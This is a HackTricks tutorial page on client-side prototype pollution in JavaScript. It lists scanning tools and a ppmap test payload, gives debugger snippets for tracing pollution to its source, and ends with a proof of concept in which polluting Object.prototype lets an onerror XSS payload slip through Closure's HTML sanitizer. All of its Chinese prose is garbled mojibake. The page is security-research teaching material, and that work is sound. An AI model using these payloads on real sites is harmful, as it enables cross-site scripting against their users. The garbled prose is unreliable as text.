# å®¢æˆ·ç«¯åŸå‹æ±¡æŸ“

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·å‘ç°

å·¥å…· [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **å’Œ** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) å¯ç”¨äº **æŸ¥æ‰¾åŸå‹æ±¡æŸ“æ¼æ´**ã€‚

æ­¤å¤–ï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨ **æµè§ˆå™¨æ‰©å±•** [**PPScan**](https://github.com/msrkp/PPScan) **è‡ªåŠ¨** **æ‰«æ** æ‚¨ **è®¿é—®çš„** **é¡µé¢** ä»¥æŸ¥æ‰¾åŸå‹æ±¡æŸ“æ¼æ´ã€‚

### è°ƒè¯•å±æ€§çš„ä½¿ç”¨ä½ç½® <a href="#id-5530" id="id-5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### æŸ¥æ‰¾åŸå‹æ±¡æŸ“çš„æ ¹æœ¬åŸå›  <a href="#id-5530" id="id-5530"></a>

ä¸€æ—¦é€šè¿‡ä»»ä½•å·¥å…·è¯†åˆ«å‡ºåŸå‹æ±¡æŸ“æ¼æ´ï¼Œå¹¶ä¸”ä»£ç ä¸æ˜¯è¿‡äºå¤æ‚ï¼Œæ‚¨å¯ä»¥é€šè¿‡åœ¨ Chrome å¼€å‘è€…å·¥å…·ä¸­æœç´¢å…³é”®å­—ï¼Œå¦‚ `location.hash`ã€`decodeURIComponent` æˆ– `location.search`ï¼Œæ¥æ‰¾åˆ°æ¼æ´ã€‚è¿™ç§æ–¹æ³•å¯ä»¥å¸®åŠ©æ‚¨å‡†ç¡®å®šä½ JavaScript ä»£ç ä¸­çš„è„†å¼±éƒ¨åˆ†ã€‚

å¯¹äºæ›´å¤§å’Œæ›´å¤æ‚çš„ä»£ç åº“ï¼Œå‘ç°è„†å¼±ä»£ç çš„ç®€å•æ–¹æ³•åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š

1. ä½¿ç”¨å·¥å…·è¯†åˆ«æ¼æ´å¹¶è·å–ä¸€ä¸ªæ—¨åœ¨è®¾ç½®æ„é€ å‡½æ•°ä¸­å±æ€§çš„æœ‰æ•ˆè½½è·ã€‚ppmap æä¾›çš„ç¤ºä¾‹å¯èƒ½çœ‹èµ·æ¥åƒï¼š`constructor[prototype][ppmap]=reserved`ã€‚
2. åœ¨é¡µé¢ä¸Šå°†è¦æ‰§è¡Œçš„ JavaScript ä»£ç çš„ç¬¬ä¸€è¡Œè®¾ç½®æ–­ç‚¹ã€‚ä½¿ç”¨æœ‰æ•ˆè½½è·åˆ·æ–°é¡µé¢ï¼Œåœ¨æ­¤æ–­ç‚¹å¤„æš‚åœæ‰§è¡Œã€‚
3. å½“ JavaScript æ‰§è¡Œæš‚åœæ—¶ï¼Œåœ¨ JS æ§åˆ¶å°ä¸­æ‰§è¡Œä»¥ä¸‹è„šæœ¬ã€‚è¯¥è„šæœ¬å°†åœ¨åˆ›å»º 'ppmap' å±æ€§æ—¶å‘å‡ºä¿¡å·ï¼Œå¸®åŠ©å®šä½å…¶æ¥æºï¼š
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. è¿”å›åˆ° **Sources** æ ‡ç­¾å¹¶é€‰æ‹©â€œæ¢å¤è„šæœ¬æ‰§è¡Œâ€ã€‚JavaScript å°†ç»§ç»­æ‰§è¡Œï¼Œ'ppmap' å±æ€§å°†å¦‚é¢„æœŸè¢«æ±¡æŸ“ã€‚åˆ©ç”¨æä¾›çš„ä»£ç ç‰‡æ®µå¯ä»¥å¸®åŠ©è¯†åˆ« 'ppmap' å±æ€§è¢«æ±¡æŸ“çš„ç¡®åˆ‡ä½ç½®ã€‚é€šè¿‡æ£€æŸ¥ **Call Stack**ï¼Œå¯ä»¥è§‚å¯Ÿåˆ°æ±¡æŸ“å‘ç”Ÿçš„ä¸åŒå †æ ˆã€‚

åœ¨å†³å®šè°ƒæŸ¥å“ªä¸ªå †æ ˆæ—¶ï¼Œé€šå¸¸æœ‰ç”¨çš„æ˜¯é’ˆå¯¹ä¸ JavaScript åº“æ–‡ä»¶ç›¸å…³çš„å †æ ˆï¼Œå› ä¸ºåŸå‹æ±¡æŸ“é€šå¸¸å‘ç”Ÿåœ¨è¿™äº›åº“ä¸­ã€‚é€šè¿‡æ£€æŸ¥å…¶ä¸åº“æ–‡ä»¶çš„å…³è”ï¼ˆåœ¨å³ä¾§å¯è§ï¼Œç±»ä¼¼äºæä¾›çš„å›¾åƒä½œä¸ºæŒ‡å¯¼ï¼‰æ¥è¯†åˆ«ç›¸å…³å †æ ˆã€‚åœ¨æœ‰å¤šä¸ªå †æ ˆçš„æƒ…å†µä¸‹ï¼Œä¾‹å¦‚ç¬¬ 4 è¡Œå’Œç¬¬ 6 è¡Œï¼Œé€»è¾‘é€‰æ‹©æ˜¯ç¬¬ 4 è¡Œçš„å †æ ˆï¼Œå› ä¸ºå®ƒä»£è¡¨äº†æ±¡æŸ“çš„åˆå§‹å‘ç”Ÿï¼Œä»è€Œæ˜¯æ¼æ´çš„æ ¹æœ¬åŸå› ã€‚ç‚¹å‡»è¯¥å †æ ˆå°†å¼•å¯¼æ‚¨åˆ°æ˜“å—æ”»å‡»çš„ä»£ç ã€‚

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## æŸ¥æ‰¾è„šæœ¬å°å·¥å…·

å°å·¥å…·æ˜¯ **ä¸€æ—¦å‘ç° PP æ¼æ´å°†è¢«æ»¥ç”¨çš„ä»£ç **ã€‚

å¦‚æœåº”ç”¨ç¨‹åºå¾ˆç®€å•ï¼Œæˆ‘ä»¬å¯ä»¥ **æœç´¢** **å…³é”®è¯**ï¼Œå¦‚ **`srcdoc/innerHTML/iframe/createElement`** å¹¶æŸ¥çœ‹æºä»£ç ï¼Œæ£€æŸ¥æ˜¯å¦ l**eads to javascript execution**ã€‚æœ‰æ—¶ï¼Œæåˆ°çš„æŠ€æœ¯å¯èƒ½æ ¹æœ¬æ‰¾ä¸åˆ°å°å·¥å…·ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œçº¯æºä»£ç å®¡æŸ¥ä¼šæ­ç¤ºä¸€äº›ä¸é”™çš„å°å·¥å…·ï¼Œå¦‚ä¸‹é¢çš„ç¤ºä¾‹ã€‚

### ç¤ºä¾‹ åœ¨ Mithil åº“ä»£ç ä¸­æ‰¾åˆ° PP å°å·¥å…·

æŸ¥çœ‹æ­¤å†™ä½œ: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## é’ˆå¯¹æ˜“å—æ”»å‡»åº“çš„æœ‰æ•ˆè´Ÿè½½é‡æ–°ç¼–è¯‘

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## é€šè¿‡ PP ç»•è¿‡ HTML æ¸…ç†å™¨

[**è¿™é¡¹ç ”ç©¶**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) æ˜¾ç¤ºäº†ç”¨äº **ç»•è¿‡æŸäº› HTML æ¸…ç†å™¨åº“æä¾›çš„æ¸…ç†** çš„ PP å°å·¥å…·ï¼š

* **sanitize-html**

<figure><img src="../../../.gitbook/assets/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* **dompurify**

<figure><img src="../../../.gitbook/assets/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## å‚è€ƒæ–‡çŒ®

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
